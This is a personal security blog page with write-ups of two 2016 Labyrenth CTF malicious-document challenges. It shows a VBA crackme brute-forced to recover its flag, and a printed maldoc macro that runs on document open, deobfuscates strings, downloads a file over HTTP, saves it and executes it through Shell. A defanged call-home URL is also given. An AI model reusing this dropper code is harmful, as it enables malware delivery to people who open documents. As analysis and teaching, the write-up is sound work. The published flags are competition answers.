<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Page 2 | Crazy Dave&#39;s InterTube Emporium</title>
  <meta name="author" content="Crazy Dave">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="Crazy Dave&#39;s InterTube Emporium"/>

  
    <meta property="og:image" content="undefined"/>
  

  
    <link rel="alternative" href="/atom.xml" title="Crazy Dave&#39;s InterTube Emporium" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  

  <!-- CSS -->
  <link rel="stylesheet" href="/css/themes/cyborg.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  



</head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-default navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
	<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
       <a class="navbar-brand" href="/">Crazy Dave&#39;s InterTube Emporium</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/projects" title="Past, Present, and Future Projects">
			  <i class="folder"></i>Projects
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class="tags"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="user"></i>About
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 <div class="page-header page-header-inverse ">
  <h1 class="title title-inverse ">where stuff goes to the corner</h1>
</div>

<div class="row page">

	
	<div class="col-md-9">
	

		<div class="slogan">
      <i class="fa fa-heart"></i>
      now think about what you&#39;ve done
</div>    
		<div id="top_search"></div>
		<div class="mypage">
		
		<!-- title and entry -->
        <!-- render top articles firstly -->
        
        <!-- render other articles -->
        
           
			  
	
	<!-- display as entry -->	
		<h3 class="title">
			<div class="date"> 2016-08-15 </div>
			<div class="article-title"><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-02/" >2016 Palo Alto Labyrenth CTF Doc 02</a></div>						
		</h3>
	


			  <div class="entry">
  <div class="row">
	
	
		<ul>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-01/">DOC 01</a></li>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-02/">DOC 02</a> &lt;- You are here</li>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-03/">DOC 03</a></li>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-04/">DOC 04</a></li>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-05/">DOC 05</a> </li>
</ul>
<p>So we solved the frist document and then they give us this…Document #2 (hash: <a href="/data/PAN_CTF_DOCTrack_002.zip">ACCDF64EB1E96BE5A7C5F23DB6A74B88869E4F6C3B46D41F80B3063BF79AD05E</a>)</p>
<p>So again, run it through <a href="https://github.com/DBHeise/fileid" target="_blank" rel="noopener">FileId</a> tool and get the VBA code out (using the XML or JSON output options).</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Sub AutoOpen()</span><br><span class="line">&apos;</span><br><span class="line">&apos; crackme Macro</span><br><span class="line">&apos;</span><br><span class="line">&apos;</span><br><span class="line">    UserForm1.Show</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>
<p>and<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">Private Sub button_Click()</span><br><span class="line">    x = suchcrypto(key.Text, &quot;General Vidal&quot;)</span><br><span class="line">    If x = &quot;171,184,42,184,88,26,47,154,20,219,203,130,52,19,180,214,156,94,186,74,30,248,119,235,139,130,175,141,179,197,8,204,252,&quot; Then</span><br><span class="line">        MsgBox &quot;Wow. Good Job! Such crack.&quot;</span><br><span class="line">    Else</span><br><span class="line">        MsgBox &quot;U can do. Try harder...&quot;</span><br><span class="line">    End If</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Function suchcrypto(sMessage, strKey)</span><br><span class="line">    Dim kLen, x, y, i, j, temp</span><br><span class="line">    Dim s(256), k(256)</span><br><span class="line">    kLen = Len(strKey)</span><br><span class="line">    For i = 0 To 255</span><br><span class="line">        s(i) = i</span><br><span class="line">        k(i) = Asc(Mid(strKey, (i Mod kLen) + 1, 1))</span><br><span class="line">    Next</span><br><span class="line">    j = 0</span><br><span class="line">    For i = 0 To 255</span><br><span class="line">        j = (j + k(i) + s(i)) Mod 256</span><br><span class="line">        temp = s(i)</span><br><span class="line">        s(i) = s(j)</span><br><span class="line">        s(j) = temp</span><br><span class="line">    Next</span><br><span class="line">    x = 0</span><br><span class="line">    y = 0</span><br><span class="line">    For i = 1 To 3072</span><br><span class="line">        x = (x + 1) Mod 256</span><br><span class="line">        y = (y + s(x)) Mod 256</span><br><span class="line">        temp = s(x)</span><br><span class="line">        s(x) = s(y)</span><br><span class="line">        s(y) = temp</span><br><span class="line">    Next</span><br><span class="line">    For i = 1 To Len(sMessage)</span><br><span class="line">        x = (x + 1) Mod 256</span><br><span class="line">        y = (y + s(x)) Mod 256</span><br><span class="line">        temp = s(x)</span><br><span class="line">        s(x) = s(y)</span><br><span class="line">        s(y) = temp</span><br><span class="line"> </span><br><span class="line">        suchcrypto = suchcrypto &amp; (s((s(x) + s(y)) Mod 256) Xor Asc(Mid(sMessage, i, 1))) &amp; &quot;,&quot;</span><br><span class="line">    Next</span><br><span class="line">End Function</span><br></pre></td></tr></table></figure></p>
<p>ok, so we show a form, get user input and then run the “<code>button_Click</code>“ subroutine…but look, we know what the answer should be when we read the IF statement. So basic algebra here…we know one of the two inputs, we have the function, and we know the output….we can brute force…</p>
<p>ugh, brute forcing…and in VBA…ok if I have to…<em>sigh</em>. In retrospect, I can think of several other ways to attack this “crypto” other than brute forcing, but that’s what I did in the moment.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Sub BruteEnForcer()</span><br><span class="line">    ans = &quot;171,184,42,184,88,26,47,154,20,219,203,130,52,19,180,214,156,94,186,74,30,248,119,235,139,130,175,141,179,197,8,204,252,&quot;</span><br><span class="line">    k = &quot;General Vidal&quot;</span><br><span class="line"></span><br><span class="line">    msg = &quot;&quot;</span><br><span class="line">    Do</span><br><span class="line">    </span><br><span class="line">    Loop Until suchcrypto(msg, k) = ans</span><br><span class="line"></span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure></p>
<p>ok, so now we have a simple logic/programming problem. We know what the result will be, but how can we figure out what the msg variable should be. How do we know when we are even close…are we going to iterate over all possible typable strings until we find a match? No, well we could, but no just no. You’ll notice there are a bunch of comma’s in the ‘answer’ string and based on the ‘decyption’ code it appends a comma after iterating over each letter in the message. So lets make that answer an array and go character by character until we get matches. I’m also going to limit it to alphanumeric characters, unless that doesn’t work. I would post by brute forcing code that I used, but I didn’t save it…so here’s some code that <em>might</em> work:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Sub BruteEnForcer()</span><br><span class="line">    ans = &quot;171,184,42,184,88,26,47,154,20,219,203,130,52,19,180,214,156,94,186,74,30,248,119,235,139,130,175,141,179,197,8,204,252,&quot;</span><br><span class="line">    k = &quot;General Vidal&quot;</span><br><span class="line">    </span><br><span class="line">    ansArry = Split(ans, &quot;,&quot;)</span><br><span class="line">    </span><br><span class="line">    msg = &quot;&quot;</span><br><span class="line">    leng = 1</span><br><span class="line">    Do</span><br><span class="line">        For i = 32 To 126</span><br><span class="line">            tmpMsg = msg + Chr(i)</span><br><span class="line">            tmp = Split(suchcrypto(tmpMsg, k), &quot;,&quot;)</span><br><span class="line">            If tmp(leng) = ansArry(leng) Then</span><br><span class="line">                msg = tmpMsg</span><br><span class="line">                leng = leng + 1</span><br><span class="line">                Exit For</span><br><span class="line">            End If</span><br><span class="line">        Next i</span><br><span class="line">    Loop Until suchcrypto(msg, k) = ans</span><br><span class="line">    MsgBox msg</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure></p>
<p>which when run gives us the following output:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PAN&#123;L4$t_Night_@f@iry_Vizited_M3&#125;</span><br></pre></td></tr></table></figure></p>
<p>gee that looks like it might be it…</p>
<p>BOOM</p>
<p>and we move on to doc #3</p>

	
	</div>
  <a type="button" href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-02/#more" class="btn btn-default more">Read More</a>
</div>

           
		
           
			  
	
	<!-- display as entry -->	
		<h3 class="title">
			<div class="date"> 2016-08-15 </div>
			<div class="article-title"><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-01/" >2016 Palo Alto Labyrenth CTF - Doc 01</a></div>						
		</h3>
	


			  <div class="entry">
  <div class="row">
	
	
		<p>On 2016-07-15 at 5pm EST <a href="https://www.paloaltonetworks.com/" target="_blank" rel="noopener">Palo Alto Networks</a> started a <a href="https://en.wikipedia.org/wiki/Capture_the_flag#Computer_security" target="_blank" rel="noopener">Capture the Flag</a> competition with cash prizes called <a href="http://www.labyrenth.com/" target="_blank" rel="noopener">PAN Labyrenth CTF</a>. When I looked at the challenges I noticed that there was a Documents track, and since there was a cash prize to the frist person to complete a given track I thought I’d give it a go..hey $1000 for a few hours is not bad. It only took me a few hours (actually more than I intended because I got stuck overthinking one of the problems), but I don’t think I was the first one to complete the track. Regardless, I thought I’d share the steps I went through to solve each of the challenges.</p>
<ul>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-01/">DOC 01</a> &lt;- You are here</li>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-02/">DOC 02</a></li>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-03/">DOC 03</a></li>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-04/">DOC 04</a></li>
<li><a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-05/">DOC 05</a> </li>
</ul>
<p>So to get starting running the CTF you need the initial code for the DOCs track which is found on the getting started page…it was <em>PAN{DOCS_START}</em>. Upon entering this you are given a zip file to download (hash: <a href="/data/PAN_CTF_DOCTrack_001.zip">846CBD76B491FD6F74212A4259FE933A0FEBF3E5EA93D24A91241EDCD98D5EDC</a>). This file contains two items, one the first document named challenge.doc (hash:9BBEDADF4A5A9CC75DDA5F4CCE7416BEDD1B2221BF80BF6C3CC73DFEE9A337CD), and the second is a file simply named “.7z” (hash:B588AAC998556D1F853AD8C3D4D428CEB26B7D38CFD073CC77C82F4C6EF4FA97). We’ll come back to this file in a little bit (as it is a shortcut), but let start with the other file “”.</p>
<p>So what do you do first? Open the file in word? Are you a n00b or insane? probably a little of both…if you’re going to go this route, please make sure that you’re doing it on a machine you can easily clean and have some sort of network monitoring turned on….or a sandbox of somesort.</p>
<p>So you can just open it if you trust the document or know what you’re doing…but don’t trust it, are you even sure its actually a document? You need a tool to determine as much as you can without running it…this is static analysis. Personal I lean on tools that I’ve written, but there are lots of great tools out there and I’m not trying to steer you away or towards any particular tool…I’m just showing you what I did.</p>
<p>So we run it through my <a href="https://github.com/DBHeise/fileid" target="_blank" rel="noopener">FileId</a> tool and get the VBA code out (using the XML or JSON output options). You could also use many other tools, for example: <a href="http://www.decalage.info/python/oletools" target="_blank" rel="noopener">OleTools</a> by Philippe Lagadec, or <a href="https://blog.didierstevens.com/programs/oledump-py/" target="_blank" rel="noopener">OleDump</a> by Didier Stevens. In the end you get this code:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">Private Function QklkhFEQNB(HGKuttPaRM As Variant, UBvkWqzieX As Integer)</span><br><span class="line">	Dim gsFEVmmIzO, vSHOfSrEta As String, dHLdiEqdts, eUTAbMoUIA</span><br><span class="line">	vSHOfSrEta = ActiveDocument.Variables(&quot;ppKzr&quot;).Value()</span><br><span class="line">	gsFEVmmIzO = &quot;&quot;</span><br><span class="line">	dHLdiEqdts = 1</span><br><span class="line">	While dHLdiEqdts &lt; UBound(HGKuttPaRM) + 2</span><br><span class="line">		eUTAbMoUIA = dHLdiEqdts Mod Len(vSHOfSrEta): If eUTAbMoUIA = 0 Then eUTAbMoUIA = Len(vSHOfSrEta)</span><br><span class="line">		gsFEVmmIzO = gsFEVmmIzO + Chr(Asc(Mid(vSHOfSrEta, eUTAbMoUIA + UBvkWqzieX, 1)) Xor CInt(HGKuttPaRM(dHLdiEqdts - 1)))</span><br><span class="line">		dHLdiEqdts = dHLdiEqdts + 1</span><br><span class="line">	Wend</span><br><span class="line">	QklkhFEQNB = gsFEVmmIzO</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Public Function BkAIuNwQNDkohBY()</span><br><span class="line">	twOvwCSTPL = QklkhFEQNB(Array(5, 5, 27, 65, 89, 98, 85, 86, 71, 75, 66, 92, 95, 98, 67, 64, 89, 83, 84, 95, 26, _</span><br><span class="line">	78, 116, 78, 91, 5, 116, 32, 72, 2, 33, 48, 10, 29, 61, 8, 37, 20, 63, 44, 1, _</span><br><span class="line">	12, 62, 38, 47, 52, 99, 57, 5, 121, 89, 37, 65, 32, 32, 11, 98, 42, 58, 32, 28, _</span><br><span class="line">	9, 3, 117, 85, 4, 57, 10, 94, 0, 16, 8, 28, 42, 30, 121, 71, 6, 8, 9, 37, _</span><br><span class="line">	2, 23, 34, 21, 120, 54, 7, 40, 35, 75, 50, 87, 3, 55, 47, 99, 52, 13, 0, 42, _</span><br><span class="line">	30, 27, 126, 59, 3, 123, 29, 52, 44, 53, 29, 15, 50, 12, 35, 8, 48, 89, 54, 27, _</span><br><span class="line">	62, 28, 8, 36, 49, 119, 104, 14, 5, 64, 34, 43, 22, 71, 5, 46, 7, 66, 42, 0, _</span><br><span class="line">	1, 113, 97, 83, 31, 45, 95, 111, 31, 40, 51), 24)</span><br><span class="line">	UkIWIEtqCF = QklkhFEQNB(Array(42, 115, 2), 188)</span><br><span class="line">	Dim xHttp: Set xHttp = CreateObject(QklkhFEQNB(Array(116, 7, 6, 74, 60, 43, 42, 36, 64, 70, 110, 27, 28, 12, 12, 17, 23), 0))</span><br><span class="line">	Dim bStrm: Set bStrm = CreateObject(QklkhFEQNB(Array(15, 32, 32, 53, 35, 89, 22, 25, 65, 53, 51, 26), 176))</span><br><span class="line">	xHttp.Open UkIWIEtqCF, twOvwCSTPL, False</span><br><span class="line">	xHttp.Send</span><br><span class="line">	With bStrm</span><br><span class="line">		.Type = 1</span><br><span class="line">		.Open</span><br><span class="line">		.write xHttp.responseBody</span><br><span class="line">		.savetofile QklkhFEQNB(Array(20, 39, 81, 118, 52, 78, 11), 17), 2</span><br><span class="line">	End With</span><br><span class="line">	Shell (QklkhFEQNB(Array(20, 39, 81, 118, 52, 78, 11), 17))</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Private Sub Document_Open()</span><br><span class="line">	If ActiveDocument.Variables(&quot;ppKzr&quot;).Value &lt;&gt; &quot;toto&quot; Then</span><br><span class="line">		BkAIuNwQNDkohBY</span><br><span class="line">		ActiveDocument.Variables(&quot;ppKzr&quot;).Value = &quot;toto&quot;</span><br><span class="line">		If ActiveDocument.ReadOnly = False Then</span><br><span class="line">			ActiveDocument.Save</span><br><span class="line">		End If</span><br><span class="line">	End If</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure></p>
<p>Looking at this code I can see a couple of things that stand out:</p>
<ol>
<li>the QklkhFEQNB function is the string deobfuscation function. You can tell this by its frequency of use and its always called before the string is needed (look for CreateObject)</li>
<li>it does have an autorun functionality (i.e. “Document_Open”), so if we had opened the file and ran the macros it would have done its business</li>
</ol>
<p>What is its business, well without too much digging we can see that it has a variable named xHttp and xStrm in the BkAIuNwQNDkohBY function and we can see that there is a Shell command. Often variable names are also obfuscated in malicious documents so the fact that they aren’t kind of stands out. So it downloads something, saves it to disk, and executes it.</p>
<p>So first things first we want to see to where it calls home. To accomplish this we have the deobfuscation function in VBA, so lets open M$Word, create a new document, open up the VBA Editor and drop it in. </p>
<p>If you do this you will see that it won’t quite work that simply. If you look carefully at the deobfuscation function you’ll notice it references a document variable:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ActiveDocument.Variables(&quot;ppKzr&quot;).Value()</span><br></pre></td></tr></table></figure></p>
<p>and in the Document_Open subroutine it references this same variable and sets it to “toto”. Knee-jerk reaction replace that with the static string “toto”….nope won’t work, remember the way the code is written it must NOT be “toto” at first. So we have a couple of options at this point:</p>
<ol>
<li>We can brute force the value for the “ppKzr” variable</li>
<li>We can try to look up the value</li>
<li>We can just run it though a sandbox, or something monitoring the network traffic involved</li>
</ol>
<p>At this point I honestly went with option #3 (but we’ll come back to the other two options in other documents in this CTF track)…it was easy and quick.</p>
<p>In the end we have this URL that it tries to call home to (defanged):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hXXp://&#123;REDACTED RFC1918 IPv4&#125;/b64/x58/MDgxOTE2MjMwZTMxMDIzMTNhNjk2YjA3NjgzNjM0MjE2YTJjMzA2ODJiNmIwNzBmMzA2ODA3MTMz\nNjY4MmYwNzJmMzA2YjJhNmI2YTM0Njg2ODMzMjU=/evil.executes</span><br></pre></td></tr></table></figure></p>
<p>well that IP doesn’t help us, its a <a href="https://www.rfc-editor.org/rfc/rfc1918.txt" target="_blank" rel="noopener">RFC1918</a> (or via <a href="https://en.wikipedia.org/wiki/Private_network" target="_blank" rel="noopener">Wikipedia</a>) private block…but hmmm, that blob in the middle looks base64 encoded…and it even says “b64” but it also has a 0x58 before the blob…we’ll come back to that. So you run the “MDgx…jU=” string through your base64 decoder of choice (I used powershell):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$s1 = &quot;MDgxOTE2MjMwZTMxMDIzMTNhNjk2YjA3NjgzNjM0MjE2YTJjMzA2ODJiNmIwNzBmMzA2ODA3MTMz\nNjY4MmYwNzJmMzA2YjJhNmI2YTM0Njg2ODMzMjU=&quot;</span><br><span class="line">[Convert]::FromBase64String($s1)</span><br></pre></td></tr></table></figure>
<p>You run the above and you’ll get an error immediate error:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Exception calling &quot;FromBase64String&quot; with &quot;1&quot; argument(s): &quot;The input is not a valid Base-64 string as it contains a non-base 64</span><br><span class="line">character, more than two padding characters, or an illegal character among the padding characters. &quot;</span><br></pre></td></tr></table></figure></p>
<p>Not a valid base64 string?? hmmm…lets look at that string again…wait there’s a “\n” in that string….ok so we can either take it out or make sure powershell properly escapes it…just change “\n” to “`n” as this is how powershell escapes stuff. So we run it through the base64 decoding function again and it works…but its just a bunch of bytes…but wait there all in a small range. Taking a guess that its an ASCII string I’ll run this powershell command:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($s1))</span><br></pre></td></tr></table></figure></p>
<p>boom and I get a string (shortened for brevity):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">081916230e3102313a696b07683634216...68071336682f072f306b2a6b6a3468683325</span><br></pre></td></tr></table></figure></p>
<p>well that isn’t very interesting, but I think I’m stil on the right track. Now I need to go back to the 0x58…hmmm…I wonder if this an XOR string and perhaps the 0x58 is the key. How would I check this? I’ll turn to another tool <a href="http://www.kahusecurity.com/tools/" target="_blank" rel="noopener">DataConverter</a> by Kahu Security (of course there are other tools…)</p>
<p>So I put our string in and mark it as Hex format (looks hex to me), and enter our hex key 0x58 and we get (key is REDACTED for you pleasure):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PAN&#123;_REDACTED_&#125;</span><br></pre></td></tr></table></figure></p>
<p>huh…PAN{<em>blahblahblah</em>} that looks like the key we entered to get this started…lets try it out…</p>
<p>POOF</p>
<p>…it works and we get doc02</p>

	
	</div>
  <a type="button" href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-01/#more" class="btn btn-default more">Read More</a>
</div>

           
		
           
			  
	
	<!-- display as entry -->	
		<h3 class="title">
			<div class="date"> 2016-08-13 </div>
			<div class="article-title"><a href="/2016/08/13/Stuff-and-things-yet-to-do/" >Stuff and things yet to do</a></div>						
		</h3>
	


			  <div class="entry">
  <div class="row">
	
	
		<p>so one of the things this blog is going to try to accomplish is collect all the various items that I’ve put on various places in the web. This means old school projects/papers/writings/thoughts as well as linking to &amp; copying of content that I’ve produced that lives elsewhere on the web.</p>
<p>We’ll see how it goes…</p>

	
	</div>
  <a type="button" href="/2016/08/13/Stuff-and-things-yet-to-do/#more" class="btn btn-default more">Read More</a>
</div>

           
		
           
			  
	
	<!-- display as entry -->	
		<h3 class="title">
			<div class="date"> 2016-08-13 </div>
			<div class="article-title"><a href="/2016/08/13/first/" >first</a></div>						
		</h3>
	


			  <div class="entry">
  <div class="row">
	
	
		<p>so i’m trying to start to blog again…not because I want to talk, but because I want one consistant place to put everything…</p>
<p>we’ll see how it goes!</p>

	
	</div>
  <a type="button" href="/2016/08/13/first/#more" class="btn btn-default more">Read More</a>
</div>

           
		

		</div>

		<!-- pagination -->
		<div>
  		<center>
		<div class="pagination">
<ul class="pagination">
	 
		
    	<li class="prev"><a href="/" class="alignleft prev"><i class="fa fa-arrow-circle-o-left"></i> Prev</a></li>
  		

        <li><a href="/"><i class="fa fa-home"></i>Home</a></li>

		
          <li class="next disabled"><a>Next<i class="fa fa-arrow-circle-o-right"></i></a></li>
        
	
</ul>
</div>

  		</center>
		</div>

		
		
	</div> <!-- col-md-9 -->

	
		<div class="col-md-3">
	<div id="sidebar">
	
			
  <div id="site_search">
   <div class="form-group">
    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
   </div>  
  <div id="local-search-result"></div>
  </div>


		
			
		
			
	<div class="widget">
		<h4>Tag Cloud</h4>
		<ul class="tag_box inline list-unstyled">		
		
			<li><a href="/tags/maldoc/">maldoc<span>5</span></a></li>
		
			<li><a href="/tags/CTF/">CTF<span>5</span></a></li>
		
			<li><a href="/tags/obligitory/">obligitory<span>1</span></a></li>
		
			<li><a href="/tags/ScreenSaver/">ScreenSaver<span>1</span></a></li>
		
			<li><a href="/tags/halfthoughts/">halfthoughts<span>1</span></a></li>
		
			<li><a href="/tags/archive/">archive<span>1</span></a></li>
		
			<li><a href="/tags/SVG/">SVG<span>1</span></a></li>
		
			<li><a href="/tags/Labyrenth/">Labyrenth<span>6</span></a></li>
		
			<li><a href="/tags/security/">security<span>5</span></a></li>
		
			<li><a href="/tags/VB/">VB<span>1</span></a></li>
		
		 
		</ul>
	</div>


		
			
<div class="widget">
  <h4>Recent Posts</h4>
  <ul class="entry list-unstyled">
    
      <li>
        <a href="/2018/01/22/New-HTML-Experiments/" ><i class="fa fa-file-o"></i>New HTML Experiments</a>
      </li>
    
      <li>
        <a href="/2016/08/21/My-First-ScreenSaver-an-obsession-in-VB6/" ><i class="fa fa-file-o"></i>My First ScreenSaver - an o...</a>
      </li>
    
      <li>
        <a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-05/" ><i class="fa fa-file-o"></i>2016 Palo Alto Labyrenth CT...</a>
      </li>
    
      <li>
        <a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-04/" ><i class="fa fa-file-o"></i>2016 Palo Alto Labyrenth CT...</a>
      </li>
    
      <li>
        <a href="/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-03/" ><i class="fa fa-file-o"></i>2016 Palo Alto Labyrenth CT...</a>
      </li>
    
  </ul>
</div>

		
			
<div class="widget">
	<h4>Links</h4>
	<ul class="blogroll list-unstyled">
	
		<li><i class=""></i><a href="https://twitter.com/DavidBHeise" title="" target="_blank"]);">Twitter</a></li>
	
		<li><i class=""></i><a href="https://github.com/DBHeise" title="" target="_blank"]);">GitHub</a></li>
	
		<li><i class=""></i><a href="http://stackexchange.com/users/7529/david-b-heise" title="" target="_blank"]);">Stack Exchange</a></li>
	
		<li><i class=""></i><a href="https://bitbucket.org/CrazyDave/" title="" target="_blank"]);">BitBucket</a></li>
	
		<li><i class=""></i><a href="http://pastebin.com/u/CrazyDave137" title="" target="_blank"]);">Pastebin</a></li>
	
	</ul>
</div>


		
	</div> <!-- sidebar -->
</div> <!-- col-md-3 -->

	
	
</div> <!-- row-fluid -->


	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  &copy; 2018 Crazy Dave
     
</p> </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>▲</span> 
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 




   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
